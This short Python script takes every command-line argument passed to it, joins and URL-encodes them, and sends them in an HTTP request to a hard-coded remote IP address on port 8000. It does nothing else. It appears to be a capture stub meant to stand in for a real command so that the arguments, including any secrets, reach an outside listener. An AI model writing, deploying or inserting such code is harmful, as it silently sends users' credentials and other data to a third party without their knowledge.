#!/usr/bin/python
import requests
import sys

out = requests.utils.quote("|".join(sys.argv))
r = requests.get(f"http://52.25.165.198:8000?{out}")